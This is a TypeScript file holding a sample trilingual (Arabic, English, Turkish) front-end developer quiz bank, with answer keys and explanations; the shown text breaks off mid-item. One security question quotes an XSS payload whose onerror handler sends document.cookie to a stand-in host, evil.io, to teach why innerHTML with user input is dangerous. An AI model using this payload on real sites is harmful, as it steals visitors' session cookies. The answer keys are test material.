import type { Question } from '#shared/types/quiz'

/**
 * Sample question bank: one question per topic and level, so a public clone runs.
 * The full bank is private and is fetched at build time (scripts/ensure-questions.mjs).
 */
export const QUESTIONS: Question[] = [
  {
    "id": "j-nullish",
    "level": "junior",
    "topic": "javascript",
    "codeLang": "js",
    "code": "const settings = { volume: 0 };\n\nconsole.log(settings.volume || 50);\nconsole.log(settings.volume ?? 50);",
    "options": [
      "50, 0",
      "0, 0",
      "50, 50",
      "0, 50"
    ],
    "answer": 0,
    "text": {
      "ar": {
        "prompt": "المستخدم أطفأ الصوت (volume = 0). ماذا يُطبع؟",
        "explanation": "العامل || يعتبر 0 قيمة falsy فيستبدلها بـ 50، فيعود الصوت رغم أن المستخدم أطفأه. أما ?? فلا يستبدل إلا null وundefined، لذلك يحافظ على 0."
      },
      "en": {
        "prompt": "The user muted the sound (volume = 0). What gets logged?",
        "explanation": "|| treats 0 as falsy and replaces it with 50, so the sound comes back even though the user muted it. ?? only replaces null and undefined, so 0 is kept."
      },
      "tr": {
        "prompt": "Kullanıcı sesi kapattı (volume = 0). Konsola ne yazılır?",
        "explanation": "|| operatörü 0’ı falsy kabul edip 50 ile değiştirir; kullanıcı sesi kapatsa da ses geri gelir. ?? ise yalnızca null ve undefined değerlerini değiştirir, bu yüzden 0 korunur."
      }
    }
  },
  {
    "id": "j-button",
    "run": false,
    "level": "junior",
    "topic": "html",
    "options": [
      "<div onclick=\"save()\">",
      "<span onclick=\"save()\">",
      "<button type=\"button\">",
      "<a href=\"#\">"
    ],
    "answer": 2,
    "text": {
      "ar": {
        "prompt": "تريد زرًّا لحفظ النموذج (ليس رابطًا لصفحة أخرى). أي عنصر هو الأنسب؟",
        "explanation": "button يعمل بلوحة المفاتيح (Tab وEnter وSpace)، وقارئ الشاشة يعلن أنه زر، كل ذلك تلقائيًا. div وspan يحتاجان كودًا إضافيًا ليصلا لنفس النتيجة، والرابط مخصص للتنقل."
      },
      "en": {
        "prompt": "You need a control that saves a form (not a link to another page). Which element fits best?",
        "explanation": "A button works with the keyboard (Tab, Enter, Space) and screen readers announce it as a button, all for free. div and span need extra code to match that, and links are meant for navigation."
      },
      "tr": {
        "prompt": "Bir formu kaydeden bir kontrol gerekiyor (başka sayfaya bağlantı değil). Hangi öğe en uygun?",
        "explanation": "button klavyeyle (Tab, Enter, Space) çalışır ve ekran okuyucular onu buton olarak duyurur; hepsi kendiliğinden. div ve span için ek kod gerekir, bağlantılar ise sayfa geçişi içindir."
      }
    }
  },
  {
    "id": "m-var-loop",
    "level": "mid",
    "topic": "async",
    "codeLang": "js",
    "code": "for (var i = 0; i < 3; i++) {\n  setTimeout(() => console.log(i), 0);\n}",
    "options": [
      "0 1 2",
      "3 3 3",
      "2 2 2",
      "undefined undefined undefined"
    ],
    "answer": 1,
    "text": {
      "ar": {
        "prompt": "ماذا يُطبع؟",
        "explanation": "var له متغير واحد لكل الحلقة. الدوال داخل setTimeout تعمل بعد انتهاء الحلقة، وعندها تكون i قد صارت 3. مع let يُنشأ متغير جديد في كل دورة فيُطبع 0 1 2."
      },
      "en": {
        "prompt": "What gets logged?",
        "explanation": "var creates one variable for the whole loop. The setTimeout callbacks run after the loop ends, when i is already 3. With let, each iteration gets its own i, so it logs 0 1 2."
      },
      "tr": {
        "prompt": "Konsola ne yazılır?",
        "explanation": "var tüm döngü için tek bir değişken oluşturur. setTimeout fonksiyonları döngü bittikten sonra çalışır; o anda i zaten 3’tür. let ile her turda yeni bir i oluşur ve 0 1 2 yazılır."
      }
    }
  },
  {
    "id": "m-react-key",
    "run": false,
    "level": "mid",
    "topic": "react",
    "codeLang": "jsx",
    "code": "// Each <Item> keeps its own \"checked\" state\n{items.map((item, i) => (\n  <Item key={i} name={item} />\n))}\n\n// items: ['Milk', 'Bread', 'Eggs']\n// 1. The user checks \"Bread\"\n// 2. \"Milk\" is deleted",
    "answer": 1,
    "text": {
      "ar": {
        "prompt": "بعد حذف \"Milk\"، أي عنصر يظهر معلَّمًا؟",
        "options": [
          "يبقى \"Bread\" معلَّمًا",
          "يصبح \"Eggs\" معلَّمًا",
          "لا شيء معلَّم",
          "يظهر خطأ"
        ],
        "explanation": "React يربط الحالة بالـ key. \"Bread\" كان على key = 1. بعد الحذف صار \"Eggs\" في الموضع 1 فأخذ نفس الـ key ونفس الحالة. استخدم معرّفًا ثابتًا مثل item.id بدل الفهرس."
      },
      "en": {
        "prompt": "After \"Milk\" is deleted, which item shows as checked?",
        "options": [
          "\"Bread\" stays checked",
          "\"Eggs\" becomes checked",
          "Nothing is checked",
          "An error is thrown"
        ],
        "explanation": "React ties state to the key. \"Bread\" had key = 1. After the delete, \"Eggs\" moves to position 1, gets the same key and the same state. Use a stable id like item.id instead of the index."
      },
      "tr": {
        "prompt": "\"Milk\" silindikten sonra hangi öğe işaretli görünür?",
        "options": [
          "\"Bread\" işaretli kalır",
          "\"Eggs\" işaretli olur",
          "Hiçbiri işaretli değil",
          "Hata fırlatılır"
        ],
        "explanation": "React durumu key’e bağlar. \"Bread\" key = 1 idi. Silme sonrası \"Eggs\" 1. konuma geçer, aynı key’i ve aynı durumu alır. İndeks yerine item.id gibi sabit bir kimlik kullanın."
      }
    }
  },
  {
    "id": "m-specificity",
    "run": false,
    "level": "mid",
    "topic": "css",
    "codeLang": "css",
    "code": "/* <h1 id=\"title\" class=\"title big\">Hello</h1> */\n\n#title       { color: blue; }\n.title.big   { color: red; }\nh1           { color: green; }",
    "options": [
      "blue",
      "red",
      "green",
      "black"
    ],
    "answer": 0,
    "text": {
      "ar": {
        "prompt": "ما لون العنوان؟",
        "explanation": "الأولوية تُحسب بالـ specificity لا بترتيب الأسطر. محدد id واحد (#title) أقوى من أي عدد من الـ classes (.title.big)، وهذه أقوى من اسم العنصر (h1)."
      },
      "en": {
        "prompt": "What color is the heading?",
        "explanation": "Specificity decides, not the order of the rules. One id selector (#title) beats any number of classes (.title.big), which beat an element selector (h1)."
      },
      "tr": {
        "prompt": "Başlığın rengi nedir?",
        "explanation": "Kuralların sırası değil, specificity belirler. Tek bir id seçici (#title) istediğiniz sayıda class’ı (.title.big) yener; class’lar da öğe seçicisini (h1) yener."
      }
    }
  },
  {
    "id": "s-transform",
    "run": false,
    "level": "senior",
    "topic": "css",
    "codeLang": "css",
    "code": ".card {\n  transition: ??? 300ms;\n}\n.card:hover {\n  /* move the card 20px to the right */\n}",
    "options": [
      "left",
      "margin-left",
      "transform",
      "width"
    ],
    "answer": 2,
    "text": {
      "ar": {
        "prompt": "أي خاصية تحرّك البطاقة بأسلس أداء، بدون إعادة Layout وPaint في كل إطار؟",
        "explanation": "تغيير left أو margin أو width يجبر المتصفح على إعادة حساب الـ Layout ثم الرسم في كل إطار. transform يُنفَّذ في مرحلة Composite فقط، وغالبًا على الـ GPU، فتبقى الحركة سلسة."
      },
      "en": {
        "prompt": "Which property moves the card most smoothly, without re-running Layout and Paint on every frame?",
        "explanation": "Changing left, margin or width makes the browser redo Layout and then Paint on every frame. transform only touches the Composite step, often on the GPU, so the motion stays smooth."
      },
      "tr": {
        "prompt": "Hangi özellik kartı her karede Layout ve Paint’i yeniden çalıştırmadan en akıcı şekilde hareket ettirir?",
        "explanation": "left, margin veya width değiştirmek tarayıcıyı her karede Layout ve ardından Paint yapmaya zorlar. transform yalnızca Composite adımını etkiler, çoğu zaman GPU’da; hareket akıcı kalır."
      }
    }
  },
  {
    "id": "s-setstate-batch",
    "run": false,
    "level": "senior",
    "topic": "react",
    "codeLang": "jsx",
    "code": "const [count, setCount] = useState(0);\n\nfunction handleClick() {\n  setCount(count + 1);\n  setCount(count + 1);\n  setCount(count + 1);\n}\n\n// After one click, count is…",
    "options": [
      "1",
      "3",
      "0",
      "2"
    ],
    "answer": 0,
    "text": {
      "ar": {
        "prompt": "بعد ضغطة واحدة، كم تصبح قيمة count؟",
        "explanation": "count داخل الدالة هو قيمة الـ render الحالي (0). الاستدعاءات الثلاثة تطلب setCount(1). للزيادة ثلاث مرات استخدم الصيغة الدالّية: setCount(c => c + 1)."
      },
      "en": {
        "prompt": "After one click, what is count?",
        "explanation": "count inside the handler is the value from the current render (0). All three calls ask for setCount(1). To add three times, use the updater form: setCount(c => c + 1)."
      },
      "tr": {
        "prompt": "Tek tıklamadan sonra count kaç olur?",
        "explanation": "Fonksiyon içindeki count, mevcut render’daki değerdir (0). Üç çağrının hepsi setCount(1) ister. Üç kez artırmak için güncelleyici biçimini kullanın: setCount(c => c + 1)."
      }
    }
  },
  {
    "id": "s-all-settled",
    "level": "senior",
    "topic": "async",
    "codeLang": "js",
    "code": "const results = await Promise.allSettled([\n  Promise.resolve(1),\n  Promise.reject(new Error('x')),\n  Promise.resolve(3),\n]);\n\nconsole.log(results.map(r => r.status));",
    "options": [
      "['fulfilled', 'rejected', 'fulfilled']",
      "Error: x",
      "[1, undefined, 3]",
      "['fulfilled', 'fulfilled', 'fulfilled']"
    ],
    "answer": 0,
    "text": {
      "ar": {
        "prompt": "ماذا يُطبع؟",
        "explanation": "Promise.all يتوقف عند أول رفض، أما allSettled فينتظر الجميع ولا يرمي أبدًا. يعيد لكل وعد كائنًا فيه status (fulfilled أو rejected) مع value أو reason."
      },
      "en": {
        "prompt": "What gets logged?",
        "explanation": "Promise.all stops at the first rejection; allSettled waits for all of them and never throws. It returns an object per promise with status (fulfilled or rejected) plus value or reason."
      },
      "tr": {
        "prompt": "Konsola ne yazılır?",
        "explanation": "Promise.all ilk reddedilmede durur; allSettled hepsini bekler ve asla hata fırlatmaz. Her promise için status (fulfilled veya rejected) ile value ya da reason içeren bir nesne döndürür."
      }
    }
  },
  {
    "id": "j-css-inline-width",
    "level": "junior",
    "topic": "css",
    "codeLang": "css",
    "code": "span {\n  width: 200px;\n  height: 50px;\n}",
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "لماذا لا يتغيّر عرض الـ span وارتفاعه؟",
        "explanation": "العناصر inline تأخذ حجم محتواها. لتطبيق width وheight اجعله display: inline-block أو block، أو ضعه داخل flex أو grid.",
        "options": [
          "لأن span عنصر inline، وwidth وheight لا تؤثر عليه",
          "لأن span لا يقبل CSS",
          "لأن القيم يجب أن تكون بـ %",
          "لأنه يحتاج !important"
        ]
      },
      "en": {
        "prompt": "Why do the span’s width and height not change?",
        "explanation": "Inline elements size to their content. To apply width and height, make it display: inline-block or block, or place it inside flex or grid.",
        "options": [
          "span is inline, and width and height do not apply to inline elements",
          "span does not accept CSS",
          "The values must be in %",
          "It needs !important"
        ]
      },
      "tr": {
        "prompt": "span’ın genişliği ve yüksekliği neden değişmiyor?",
        "explanation": "Inline öğeler içerikleri kadar yer kaplar. width ve height uygulamak için display: inline-block veya block yapın ya da flex/grid içine koyun.",
        "options": [
          "span inline’dır ve width/height inline öğelere uygulanmaz",
          "span CSS kabul etmez",
          "Değerler % olmalı",
          "!important gerekir"
        ]
      }
    }
  },
  {
    "id": "j-script-in-head",
    "level": "junior",
    "topic": "browser",
    "codeLang": "html",
    "code": "<head>\n  <script>\n    document.getElementById('title').textContent = 'Hello';\n  </script>\n</head>\n<body>\n  <h1 id=\"title\"></h1>\n</body>",
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "ماذا يحدث؟",
        "explanation": "المتصفح يقرأ الـ HTML من الأعلى للأسفل ويشغّل السكربت فور وصوله إليه، قبل وجود <h1>. ضع السكربت في نهاية body، أو استخدم defer.",
        "options": [
          "TypeError، لأن العنصر لم يُنشأ بعد فـ getElementById يعيد null",
          "يظهر Hello",
          "لا شيء ولا خطأ",
          "يظهر Hello بعد ثانية"
        ]
      },
      "en": {
        "prompt": "What happens?",
        "explanation": "The browser reads HTML top to bottom and runs the script as soon as it reaches it, before <h1> exists. Put the script at the end of body or use defer.",
        "options": [
          "TypeError: the element does not exist yet, so getElementById returns null",
          "Hello is shown",
          "Nothing happens, no error",
          "Hello shows after a second"
        ]
      },
      "tr": {
        "prompt": "Ne olur?",
        "explanation": "Tarayıcı HTML’i yukarıdan aşağı okur ve betiği ulaştığı anda, <h1> oluşmadan çalıştırır. Betiği body’nin sonuna koyun ya da defer kullanın.",
        "options": [
          "TypeError: öğe henüz yok, getElementById null döndürür",
          "Hello gösterilir",
          "Hiçbir şey olmaz, hata yok",
          "Hello bir saniye sonra görünür"
        ]
      }
    }
  },
  {
    "id": "m-map-parseint",
    "level": "mid",
    "topic": "javascript",
    "codeLang": "js",
    "code": "console.log(['1', '2', '3'].map(parseInt));",
    "options": [
      "[1, 2, 3]",
      "[1, NaN, NaN]",
      "[NaN, NaN, NaN]",
      "[1, NaN, 3]"
    ],
    "answer": 1,
    "text": {
      "ar": {
        "prompt": "ماذا يُطبع؟",
        "explanation": "map يمرّر (القيمة، الفهرس) للدالة. فيصبح الاستدعاء parseInt('2', 1) وparseInt('3', 2)، والفهرس هنا يُفهم كأساس العدّ (radix) فينتج NaN. استخدم map(Number) أو map(s => parseInt(s, 10))."
      },
      "en": {
        "prompt": "What gets logged?",
        "explanation": "map passes (value, index) to the callback, so the calls become parseInt('2', 1) and parseInt('3', 2). The index is read as the radix and gives NaN. Use map(Number) or map(s => parseInt(s, 10))."
      },
      "tr": {
        "prompt": "Konsola ne yazılır?",
        "explanation": "map callback’e (değer, indeks) gönderir; çağrılar parseInt('2', 1) ve parseInt('3', 2) olur. İndeks taban (radix) olarak okunur ve NaN verir. map(Number) veya map(s => parseInt(s, 10)) kullanın."
      }
    }
  },
  {
    "id": "m-vue-ref-value",
    "level": "mid",
    "topic": "vue",
    "codeLang": "vue",
    "code": "<script setup>\nimport { ref } from 'vue'\n\nconst count = ref(0)\n\nfunction add() {\n  // ?\n}\n</script>",
    "options": [
      "count++",
      "count.value++",
      "this.count++",
      "count.set(count + 1)"
    ],
    "answer": 1,
    "run": false,
    "text": {
      "ar": {
        "prompt": "أي سطر يزيد count بشكل صحيح داخل add؟",
        "explanation": "ref يغلّف القيمة في كائن، والقيمة نفسها في .value داخل الـ script. في الـ template فقط يفكّ Vue الغلاف تلقائيًا فتكتب count مباشرة."
      },
      "en": {
        "prompt": "Which line correctly increments count inside add?",
        "explanation": "ref wraps the value in an object, and in script the value lives in .value. Only in the template does Vue unwrap it for you, so there you write count."
      },
      "tr": {
        "prompt": "add içinde count’u hangi satır doğru şekilde artırır?",
        "explanation": "ref değeri bir nesneye sarar; script içinde değer .value’dadır. Yalnızca template’te Vue sarmalayıcıyı otomatik açar, orada count yazarsınız."
      }
    }
  },
  {
    "id": "m-ts-unknown",
    "level": "mid",
    "topic": "typescript",
    "codeLang": "ts",
    "code": "function handle(data: ??? ) {\n  data.toUpperCase(); // should be a compile error\n}",
    "options": [
      "any",
      "unknown",
      "never",
      "object"
    ],
    "answer": 1,
    "run": false,
    "text": {
      "ar": {
        "prompt": "تريد نوعًا يقبل أي قيمة، لكن يمنعك من استخدامها قبل التحقق من نوعها. ماذا تكتب مكان ???",
        "explanation": "any يطفئ فحص الأنواع تمامًا. unknown يقبل أي قيمة لكن لا يسمح باستخدامها حتى تتحقق منها (مثلًا typeof data === 'string'). لهذا unknown أأمن لبيانات الـ API."
      },
      "en": {
        "prompt": "You want a type that accepts any value but forces you to check it before use. What goes in place of ???",
        "explanation": "any switches type checking off. unknown accepts any value but will not let you use it until you narrow it (for example typeof data === 'string'). That makes unknown safer for API data."
      },
      "tr": {
        "prompt": "Her değeri kabul eden ama kullanmadan önce kontrol etmeye zorlayan bir tip istiyorsunuz. ??? yerine ne yazılır?",
        "explanation": "any tip kontrolünü tamamen kapatır. unknown her değeri kabul eder ama daraltana kadar kullanmanıza izin vermez (örneğin typeof data === 'string'). Bu yüzden API verisi için unknown daha güvenlidir."
      }
    }
  },
  {
    "id": "m-localstorage-string",
    "level": "mid",
    "topic": "browser",
    "codeLang": "js",
    "code": "localStorage.setItem('count', 5);\nconst count = localStorage.getItem('count');\n\nconsole.log(count + 1);",
    "options": [
      "6",
      "51",
      "NaN",
      "null"
    ],
    "answer": 1,
    "run": false,
    "text": {
      "ar": {
        "prompt": "ماذا يُطبع؟",
        "explanation": "localStorage يخزّن النصوص فقط. الرقم 5 يُحفَظ كـ \"5\"، و\"5\" + 1 = \"51\". حوّل القيمة بـ Number، أو احفظ الكائنات بـ JSON.stringify واقرأها بـ JSON.parse."
      },
      "en": {
        "prompt": "What gets logged?",
        "explanation": "localStorage stores strings only. 5 is saved as \"5\", and \"5\" + 1 = \"51\". Convert with Number, or save objects with JSON.stringify and read them with JSON.parse."
      },
      "tr": {
        "prompt": "Konsola ne yazılır?",
        "explanation": "localStorage yalnızca metin saklar. 5, \"5\" olarak kaydedilir ve \"5\" + 1 = \"51\" olur. Number ile çevirin ya da nesneleri JSON.stringify ile kaydedip JSON.parse ile okuyun."
      }
    }
  },
  {
    "id": "s-static-inherit",
    "level": "senior",
    "topic": "javascript",
    "codeLang": "js",
    "code": "class A {\n  static who() { return 'A'; }\n}\nclass B extends A {}\n\nconsole.log(B.who(), Object.getPrototypeOf(B) === A);",
    "options": [
      "A true",
      "TypeError",
      "A false",
      "undefined true"
    ],
    "answer": 0,
    "text": {
      "ar": {
        "prompt": "ماذا يُطبع؟",
        "explanation": "extends يربط سلسلتين: prototype الكائنات، وprototype الـ class نفسه. لذلك B يرث الدوال static من A، و Object.getPrototypeOf(B) هو A."
      },
      "en": {
        "prompt": "What gets logged?",
        "explanation": "extends links two chains: the instances’ prototype and the class itself. So B inherits static methods from A, and Object.getPrototypeOf(B) is A."
      },
      "tr": {
        "prompt": "Konsola ne yazılır?",
        "explanation": "extends iki zinciri bağlar: nesnelerin prototype’ını ve sınıfın kendisini. Bu yüzden B, A’nın static metotlarını miras alır ve Object.getPrototypeOf(B), A’dır."
      }
    }
  },
  {
    "id": "s-perf-layout-thrashing",
    "level": "senior",
    "topic": "performance",
    "codeLang": "js",
    "code": "for (const box of boxes) {\n  const h = box.offsetHeight;      // read\n  box.style.height = h * 2 + 'px'; // write\n}",
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "هذه الحلقة بطيئة جدًا مع 1000 عنصر. ما السبب الرئيسي؟",
        "explanation": "هذا \"layout thrashing\": المتصفح يؤجّل حساب الـ Layout، لكن قراءة offsetHeight بعد تعديل تجبره على الحساب فورًا، 1000 مرة. الحل: اقرأ كل القيم أولًا، ثم اكتب كل التعديلات.",
        "options": [
          "كل قراءة بعد كتابة تجبر المتصفح على إعادة حساب الـ Layout فورًا",
          "الحلقة for...of بطيئة بطبيعتها",
          "تحويل الرقم إلى نص مكلف",
          "style.height لا يعمل مع العناصر الكثيرة"
        ]
      },
      "en": {
        "prompt": "This loop is very slow with 1000 boxes. What is the main reason?",
        "explanation": "This is layout thrashing: the browser normally delays layout, but reading offsetHeight after a change forces it to run immediately, 1000 times. Fix: read all values first, then do all the writes.",
        "options": [
          "Each read after a write forces the browser to recalculate layout right away",
          "for...of loops are slow by nature",
          "Converting the number to a string is expensive",
          "style.height does not work with many elements"
        ]
      },
      "tr": {
        "prompt": "Bu döngü 1000 kutuyla çok yavaş. Ana neden nedir?",
        "explanation": "Buna layout thrashing denir: tarayıcı layout’u normalde erteler, ama değişiklikten sonra offsetHeight okumak onu hemen, 1000 kez çalıştırır. Çözüm: önce tüm değerleri okuyun, sonra tüm yazmaları yapın.",
        "options": [
          "Yazmadan sonraki her okuma tarayıcıyı layout’u hemen yeniden hesaplamaya zorlar",
          "for...of döngüleri doğası gereği yavaştır",
          "Sayıyı metne çevirmek pahalıdır",
          "style.height çok öğeyle çalışmaz"
        ]
      }
    }
  },
  {
    "id": "s-sec-innerhtml",
    "level": "senior",
    "topic": "security",
    "codeLang": "js",
    "code": "comment.innerHTML = userInput;",
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "مستخدم كتب في التعليق: <img src=x onerror=\"fetch('//evil.io?c='+document.cookie)\">. ماذا يحدث؟",
        "explanation": "innerHTML يحلّل النص كـ HTML، وأحداث مثل onerror تُنفَّذ حتى لو لم تُنفَّذ وسوم <script>. استخدم textContent للنصوص، وإذا احتجت HTML فنظّفه بمكتبة مثل DOMPurify.",
        "options": [
          "يُنفَّذ الكود عند كل من يرى التعليق (XSS)",
          "يظهر النص كما هو",
          "المتصفح يمنع أي onerror تلقائيًا",
          "يظهر خطأ في الـ console فقط"
        ]
      },
      "en": {
        "prompt": "A user typed this as a comment: <img src=x onerror=\"fetch('//evil.io?c='+document.cookie)\">. What happens?",
        "explanation": "innerHTML parses the text as HTML, and handlers like onerror run even though <script> tags do not. Use textContent for text; if you really need HTML, sanitize it with a library like DOMPurify.",
        "options": [
          "The code runs for everyone who views the comment (XSS)",
          "The text shows as is",
          "Browsers block every onerror automatically",
          "Only a console error appears"
        ]
      },
      "tr": {
        "prompt": "Bir kullanıcı yorum olarak şunu yazdı: <img src=x onerror=\"fetch('//evil.io?c='+document.cookie)\">. Ne olur?",
        "explanation": "innerHTML metni HTML olarak işler; <script> etiketleri çalışmasa da onerror gibi işleyiciler çalışır. Metin için textContent kullanın; HTML gerçekten gerekiyorsa DOMPurify gibi bir kütüphaneyle temizleyin.",
        "options": [
          "Kod, yorumu gören herkeste çalışır (XSS)",
          "Metin olduğu gibi görünür",
          "Tarayıcılar her onerror’ı otomatik engeller",
          "Yalnızca konsolda hata görünür"
        ]
      }
    }
  },
  {
    "id": "s-vue-watch-deep",
    "level": "senior",
    "topic": "vue",
    "codeLang": "js",
    "code": "const user = ref({ name: 'Ali' })\n\nwatch(user, () => console.log('changed'))\n\nuser.value.name = 'Omar'",
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "هل يُطبع changed؟",
        "explanation": "watch على ref يراقب استبدال .value فقط. تعديل خاصية داخلية لا يطلقه إلا مع { deep: true }، أو بمراقبة getter محدد: watch(() => user.value.name, …). أما reactive فمراقبته عميقة تلقائيًا.",
        "options": [
          "لا، لأن مراقبة ref تكون سطحية إلا مع deep: true",
          "نعم، دائمًا",
          "نعم، مرتين",
          "خطأ: لا يمكن مراقبة ref"
        ]
      },
      "en": {
        "prompt": "Is \"changed\" logged?",
        "explanation": "watch on a ref only tracks replacing .value. Changing a nested property needs { deep: true }, or watch a specific getter: watch(() => user.value.name, …). A reactive object is watched deeply by default.",
        "options": [
          "No: watching a ref is shallow unless you pass deep: true",
          "Yes, always",
          "Yes, twice",
          "Error: a ref cannot be watched"
        ]
      },
      "tr": {
        "prompt": "\"changed\" yazılır mı?",
        "explanation": "ref üzerindeki watch yalnızca .value’nun değiştirilmesini izler. İç özellik değişikliği { deep: true } ister ya da belirli bir getter izleyin: watch(() => user.value.name, …). reactive nesne varsayılan olarak derin izlenir.",
        "options": [
          "Hayır: ref izlemek deep: true verilmedikçe yüzeyseldir",
          "Evet, her zaman",
          "Evet, iki kez",
          "Hata: ref izlenemez"
        ]
      }
    }
  },
  {
    "id": "s-ts-keyof",
    "level": "senior",
    "topic": "typescript",
    "codeLang": "ts",
    "code": "function get<T, K extends keyof T>(obj: T, key: K): T[K] {\n  return obj[key];\n}\n\nconst user = { id: 1, name: 'Ali' };\nconst a = get(user, 'name');\nconst b = get(user, 'email');",
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "ماذا يقول TypeScript عن a وb؟",
        "explanation": "K extends keyof T يحصر المفتاح في مفاتيح الكائن الفعلية، وT[K] يعطي نوع تلك الخاصية بالضبط. \"email\" ليس من مفاتيح user فيُرفض قبل التشغيل.",
        "options": [
          "a نوعها string، وb خطأ عند الترجمة",
          "الاثنان any",
          "a نوعها string | number، وb نوعها undefined",
          "لا أخطاء"
        ]
      },
      "en": {
        "prompt": "What does TypeScript say about a and b?",
        "explanation": "K extends keyof T limits the key to the object’s real keys, and T[K] gives that exact property type. \"email\" is not a key of user, so it is rejected before running.",
        "options": [
          "a is string, and b is a compile error",
          "Both are any",
          "a is string | number, b is undefined",
          "No errors"
        ]
      },
      "tr": {
        "prompt": "TypeScript a ve b hakkında ne der?",
        "explanation": "K extends keyof T anahtarı nesnenin gerçek anahtarlarıyla sınırlar, T[K] o özelliğin tam tipini verir. \"email\" user’ın anahtarı değildir, çalışmadan önce reddedilir.",
        "options": [
          "a string’dir, b derleme hatasıdır",
          "İkisi de any",
          "a string | number, b undefined",
          "Hata yok"
        ]
      }
    }
  },
  {
    "id": "s-cache-no-cache",
    "level": "senior",
    "topic": "browser",
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "ماذا يعني Cache-Control: no-cache؟",
        "explanation": "الاسم مضلِّل: no-cache يعني \"تحقّق أولًا\" (مثلًا عبر ETag فيرد السيرفر 304 بدون إعادة الملف). المنع الكامل هو no-store. ولملفات تحمل hash في اسمها استخدم max-age طويل مع immutable.",
        "options": [
          "يمكن التخزين، لكن يجب التحقق من السيرفر قبل كل استخدام",
          "ممنوع التخزين نهائيًا",
          "خزّن لمدة سنة",
          "لا يُخزَّن إلا في الـ CDN"
        ]
      },
      "en": {
        "prompt": "What does Cache-Control: no-cache mean?",
        "explanation": "The name is misleading: no-cache means \"check first\" (for example with an ETag, so the server answers 304 without resending). Never storing is no-store. For files with a hash in their name, use a long max-age with immutable.",
        "options": [
          "It may be stored, but must be revalidated with the server before each use",
          "Never store it at all",
          "Store it for a year",
          "Store it only in the CDN"
        ]
      },
      "tr": {
        "prompt": "Cache-Control: no-cache ne anlama gelir?",
        "explanation": "Adı yanıltıcıdır: no-cache \"önce kontrol et\" demektir (ör. ETag ile; sunucu dosyayı yeniden göndermeden 304 döner). Hiç saklamamak no-store’dur. Adında hash olan dosyalar için uzun max-age ve immutable kullanın.",
        "options": [
          "Saklanabilir ama her kullanımdan önce sunucuyla doğrulanmalıdır",
          "Asla saklanmaz",
          "Bir yıl saklanır",
          "Yalnızca CDN’de saklanır"
        ]
      }
    }
  },
  {
    "id": "a-j-interpolation",
    "level": "junior",
    "topic": "angular",
    "options": [
      "{{ title }}",
      "[title]",
      "(title)",
      "#title"
    ],
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "كيف تعرض قيمة الخاصية title من الـ component داخل الـ template؟",
        "explanation": "الأقواس المزدوجة {{ }} هي interpolation: تعرض القيمة كنص وتتحدث عندما تتغير. أما [ ] فلربط خاصية في عنصر، و( ) للأحداث، و# لمتغير مرجعي في الـ template."
      },
      "en": {
        "prompt": "How do you show the component property title in the template?",
        "explanation": "Double braces {{ }} are interpolation: they show the value as text and update when it changes. [ ] binds an element property, ( ) listens to events, and # declares a template reference variable."
      },
      "tr": {
        "prompt": "Component’teki title özelliğini template içinde nasıl gösterirsin?",
        "explanation": "Çift süslü parantez {{ }} interpolation’dır: değeri metin olarak gösterir ve değiştikçe günceller. [ ] bir özelliğe bağlar, ( ) olay dinler, # ise template referans değişkeni tanımlar."
      }
    }
  },
  {
    "id": "a-m-output-event",
    "level": "mid",
    "topic": "angular",
    "codeLang": "html",
    "code": "<app-user-form (saved)=\"onSaved(???)\" />",
    "options": [
      "$event",
      "event",
      "value",
      "this.user"
    ],
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "الابن يرسل حدثًا بـ this.saved.emit(user). في template الأب، ما اسم المتغير الذي يحمل القيمة المرسلة؟",
        "explanation": "في ربط الأحداث، $event هو ما مُرِّر إلى emit() (أو كائن الحدث الأصلي في عناصر الـ DOM). فتكتب (saved)=\"onSaved($event)\"."
      },
      "en": {
        "prompt": "The child sends an event with this.saved.emit(user). In the parent template, which variable holds the sent value?",
        "explanation": "In an event binding, $event is whatever was passed to emit() (or the native event for DOM elements). So you write (saved)=\"onSaved($event)\"."
      },
      "tr": {
        "prompt": "Alt component this.saved.emit(user) ile olay gönderiyor. Üst template’te gönderilen değeri hangi değişken tutar?",
        "explanation": "Olay bağlamada $event, emit()’e verilen değerdir (DOM elemanlarında ise yerel olay nesnesi). Yani (saved)=\"onSaved($event)\" yazılır."
      }
    }
  },
  {
    "id": "a-s-onpush-mutation",
    "level": "senior",
    "topic": "angular",
    "codeLang": "ts",
    "code": "// parent\naddItem() {\n  this.items.push('new');\n}\n// template: <app-list [items]=\"items\" />",
    "answer": 0,
    "run": false,
    "text": {
      "ar": {
        "prompt": "الابن يستخدم ChangeDetectionStrategy.OnPush ويستقبل items. الأب ينفّذ الكود التالي. هل تتحدث قائمة الابن؟",
        "explanation": "مع OnPush يُفحص الـ component عندما يتغير مرجع input، أو يقع حدث بداخله، أو يرسل async pipe قيمة، أو تتغير signal يقرؤها. push() يغيّر المصفوفة نفسها، فيبقى المرجع كما هو. الحل: this.items = [...this.items, 'new'].",
        "options": [
          "لا، لأن المرجع (reference) نفسه لم يتغير",
          "نعم، دائمًا",
          "نعم، لكن بعد ثانية",
          "تحدث خطأ في الـ console"
        ]
      },
      "en": {
        "prompt": "The child uses ChangeDetectionStrategy.OnPush and receives items. The parent runs this code. Does the child’s list update?",
        "explanation": "With OnPush the component is checked when an input reference changes, an event fires inside it, an async pipe emits, or a signal it reads changes. push() mutates the same array, so the reference stays the same. Use this.items = [...this.items, 'new'].",
        "options": [
          "No, because the array reference did not change",
          "Yes, always",
          "Yes, but a second later",
          "An error is logged"
        ]
      },
      "tr": {
        "prompt": "Alt component ChangeDetectionStrategy.OnPush kullanıyor ve items alıyor. Üst component bu kodu çalıştırıyor. Alttaki liste güncellenir mi?",
        "explanation": "OnPush’ta component; bir input referansı değişince, içinde olay olunca, async pipe değer verince ya da okuduğu bir signal değişince kontrol edilir. push() aynı diziyi değiştirir, referans aynı kalır. Çözüm: this.items = [...this.items, 'new'].",
        "options": [
          "Hayır, çünkü dizinin referansı değişmedi",
          "Evet, her zaman",
          "Evet, ama bir saniye sonra",
          "Konsola hata yazılır"
        ]
      }
    }
  },
  {
    "id": "v-j-v-on-short",
    "level": "junior",
